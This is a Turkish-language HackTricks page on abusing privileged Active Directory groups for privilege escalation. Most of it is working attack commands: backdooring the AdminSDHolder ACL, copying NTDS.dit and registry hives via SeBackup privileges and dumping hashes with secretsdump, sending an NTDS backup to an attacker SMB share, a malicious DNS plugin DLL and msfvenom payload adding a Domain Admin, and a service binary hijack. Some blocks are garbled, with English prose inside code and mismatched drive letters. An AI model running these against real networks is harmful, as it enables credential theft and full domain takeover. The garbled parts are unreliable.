# Ayrıcalıklı Gruplar

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Dünyanın **en gelişmiş** topluluk araçlarıyla desteklenen **iş akışlarını** kolayca oluşturmak ve **otomatikleştirmek** için [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) kullanın.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}

## Yönetim ayrıcalıklarına sahip iyi bilinen gruplar

* **Yönetici**
* **Alan Yöneticileri**
* **Kurumsal Yöneticiler**

## Hesap Operatörleri

Bu grup, alan üzerinde yönetici olmayan hesaplar ve gruplar oluşturma yetkisine sahiptir. Ayrıca, Alan Denetleyicisi'ne (DC) yerel giriş yapılmasını sağlar.

Bu grubun üyelerini tanımlamak için aşağıdaki komut çalıştırılır:
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Yeni kullanıcı eklemek ve DC01'e yerel giriş yapmak mümkündür.

## AdminSDHolder grubu

**AdminSDHolder** grubunun Erişim Kontrol Listesi (ACL), Active Directory içindeki tüm "korunan gruplar" için izinleri belirlediğinden kritik öneme sahiptir; bu gruplar arasında yüksek ayrıcalıklı gruplar da bulunmaktadır. Bu mekanizma, yetkisiz değişiklikleri önleyerek bu grupların güvenliğini sağlar.

Bir saldırgan, **AdminSDHolder** grubunun ACL'sini değiştirerek standart bir kullanıcıya tam izinler verebilir. Bu, o kullanıcıya tüm korunan gruplar üzerinde tam kontrol sağlamış olur. Eğer bu kullanıcının izinleri değiştirilir veya kaldırılırsa, sistemin tasarımı gereği bir saat içinde otomatik olarak geri yüklenir.

Üyeleri gözden geçirmek ve izinleri değiştirmek için kullanılacak komutlar şunlardır:
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
Bir script, geri yükleme sürecini hızlandırmak için mevcuttur: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Daha fazla bilgi için [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence) adresini ziyaret edin.

## AD Geri Dönüşüm Kutusu

Bu gruba üyelik, silinmiş Active Directory nesnelerinin okunmasına izin verir, bu da hassas bilgileri ortaya çıkarabilir:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Domain Controller Erişimi

DC üzerindeki dosyalara erişim, kullanıcı `Server Operators` grubunun bir parçası değilse kısıtlıdır, bu da erişim seviyesini değiştirir.

### Yetki Yükseltme

Sysinternals'tan `PsService` veya `sc` kullanarak, hizmet izinlerini inceleyip değiştirmek mümkündür. Örneğin, `Server Operators` grubu, belirli hizmetler üzerinde tam kontrol sahibi olup, keyfi komutların yürütülmesine ve yetki yükseltmeye olanak tanır:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Bu komut, `Server Operators` grubunun tam erişime sahip olduğunu ve bu sayede hizmetlerin yükseltilmiş ayrıcalıklar için manipüle edilebileceğini ortaya koyar.

## Yedekleme Operatörleri

`Backup Operators` grubuna üyelik, `SeBackup` ve `SeRestore` ayrıcalıkları nedeniyle `DC01` dosya sistemine erişim sağlar. Bu ayrıcalıklar, açık izinler olmaksızın, `FILE_FLAG_BACKUP_SEMANTICS` bayrağını kullanarak klasör geçişi, listeleme ve dosya kopyalama yeteneklerini etkinleştirir. Bu süreç için belirli betiklerin kullanılması gereklidir.

Grup üyelerini listelemek için şunu çalıştırın:
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Yerel Saldırı

Bu ayrıcalıkları yerel olarak kullanmak için aşağıdaki adımlar uygulanır:

1. Gerekli kütüphaneleri içe aktarın:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. `SeBackupPrivilege`'i etkinleştir ve doğrula:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Kısıtlı dizinlerden dosyaları erişim ve kopyalama, örneğin:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Saldırısı

Domain Controller'ın dosya sistemine doğrudan erişim, alan kullanıcıları ve bilgisayarları için tüm NTLM hash'lerini içeren `NTDS.dit` veritabanının çalınmasına olanak tanır.

#### diskshadow.exe Kullanarak

1. `C` sürücüsünün bir gölge kopyasını oluşturun:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. `NTDS.dit` dosyasını yedek kopyadan kopyalayın:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternatif olarak, dosya kopyalamak için `robocopy` kullanın:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Hash alımı için `SYSTEM` ve `SAM`'i çıkarın:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. `NTDS.dit` dosyasından tüm hash'leri al:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### Using wbadmin.exe

1. Saldırı makinesinde SMB sunucusu için NTFS dosya sistemini ayarlayın ve hedef makinede SMB kimlik bilgilerini önbelleğe alın.
2. Sistem yedeği ve `NTDS.dit` çıkarımı için `wbadmin.exe` kullanın:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Pratik bir gösterim için [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s) bağlantısına bakın.

## DnsAdmins

**DnsAdmins** grubunun üyeleri, DNS sunucusunda (genellikle Alan Denetleyicileri üzerinde barındırılır) SYSTEM ayrıcalıklarıyla rastgele bir DLL yüklemek için ayrıcalıklarını kullanabilirler. Bu yetenek, önemli bir istismar potansiyeli sağlar.

DnsAdmins grubunun üyelerini listelemek için:
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Rastgele DLL'yi çalıştır

Üyeler, DNS sunucusunun rastgele bir DLL'yi (yerel veya uzaktan bir paylaşımdan) yüklemesini sağlamak için aşağıdaki gibi komutlar kullanabilir:
```powershell
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
DNS hizmetinin yeniden başlatılması (bu ek izinler gerektirebilir) DLL'nin yüklenmesi için gereklidir:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
For more details on this attack vector, refer to ired.team.

#### Mimilib.dll
Aynı zamanda, belirli komutları veya ters kabukları çalıştırmak için mimilib.dll kullanmak da mümkündür. Daha fazla bilgi için [bu gönderiyi kontrol edin](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html).

### WPAD Record for MitM
DnsAdmins, global sorgu engelleme listesini devre dışı bıraktıktan sonra bir WPAD kaydı oluşturarak Man-in-the-Middle (MitM) saldırıları gerçekleştirmek için DNS kayıtlarını manipüle edebilir. Ağ trafiğini sahtelemek ve yakalamak için Responder veya Inveigh gibi araçlar kullanılabilir.

### Event Log Readers
Üyeler, düz metin şifreler veya komut yürütme detayları gibi hassas bilgilere ulaşarak olay günlüklerine erişebilirler:
```powershell
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows İzinleri
Bu grup, alan nesnesi üzerindeki DACL'leri değiştirebilir ve potansiyel olarak DCSync ayrıcalıkları verebilir. Bu grubun istismar edilmesiyle ilgili ayrıcalık yükseltme teknikleri, Exchange-AD-Privesc GitHub deposunda ayrıntılı olarak açıklanmıştır.
```powershell
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V Yöneticileri
Hyper-V Yöneticileri, sanallaştırılmış Etki Alanı Denetleyicileri üzerinde kontrol sağlamak için kullanılabilecek Hyper-V'ye tam erişime sahiptir. Bu, canlı DC'leri klonlamayı ve NTDS.dit dosyasından NTLM hash'lerini çıkarmayı içerir.

### Sömürü Örneği
Firefox'un Mozilla Bakım Servisi, Hyper-V Yöneticileri tarafından SYSTEM olarak komut çalıştırmak için sömürülebilir. Bu, korunan bir SYSTEM dosyasına sert bir bağlantı oluşturarak ve bunu kötü niyetli bir çalıştırılabilir dosya ile değiştirerek gerçekleştirilir:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
Note: Hard link exploitation has been mitigated in recent Windows updates.

## Organization Management

**Microsoft Exchange**'in kurulu olduğu ortamlarda, **Organization Management** olarak bilinen özel bir grup önemli yetkilere sahiptir. Bu grup, **tüm alan kullanıcılarının posta kutularına erişim** hakkına sahiptir ve **'Microsoft Exchange Güvenlik Grupları'** Organizasyonel Birimi (OU) üzerinde **tam kontrol** sağlar. Bu kontrol, ayrıcalık yükseltmesi için kullanılabilecek **`Exchange Windows Permissions`** grubunu içerir.

### Privilege Exploitation and Commands

#### Print Operators
**Print Operators** grubunun üyeleri, **`SeLoadDriverPrivilege`** dahil olmak üzere birkaç ayrıcalıkla donatılmıştır; bu, onlara **bir Alan Denetleyicisine yerel olarak giriş yapma**, onu kapatma ve yazıcıları yönetme yetkisi verir. Bu ayrıcalıkları kullanmak için, özellikle **`SeLoadDriverPrivilege`** yükseltilmemiş bir bağlamda görünmüyorsa, Kullanıcı Hesabı Denetimi'ni (UAC) atlamak gereklidir.

Bu grubun üyelerini listelemek için aşağıdaki PowerShell komutu kullanılır:
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Daha ayrıntılı istismar teknikleri için **`SeLoadDriverPrivilege`** ile ilgili olarak, belirli güvenlik kaynaklarına başvurulmalıdır.

#### Uzak Masaüstü Kullanıcıları
Bu grubun üyelerine Uzak Masaüstü Protokolü (RDP) aracılığıyla PC'lere erişim izni verilir. Bu üyeleri listelemek için PowerShell komutları mevcuttur:
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
RDP'yi istismar etme konusunda daha fazla bilgiye özel pentesting kaynaklarında ulaşılabilir.

#### Uzaktan Yönetim Kullanıcıları
Üyeler **Windows Uzaktan Yönetimi (WinRM)** üzerinden PC'lere erişebilir. Bu üyelerin sayımı şu şekilde gerçekleştirilir:
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
**WinRM** ile ilgili istismar teknikleri için belirli belgeler incelenmelidir.

#### Sunucu Operatörleri
Bu grup, Yedekleme ve geri yükleme ayrıcalıkları, sistem saatini değiştirme ve sistemi kapatma dahil olmak üzere Etki Alanı Denetleyicileri üzerinde çeşitli yapılandırmalar gerçekleştirme izinlerine sahiptir. Üyeleri listelemek için verilen komut:
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## Referanslar <a href="#references" id="references"></a>

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
* [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
* [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
* [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
* [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
* [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
* [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
* [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)

<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) kullanarak dünyanın **en gelişmiş** topluluk araçlarıyla desteklenen **iş akışlarını** kolayca oluşturun ve **otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
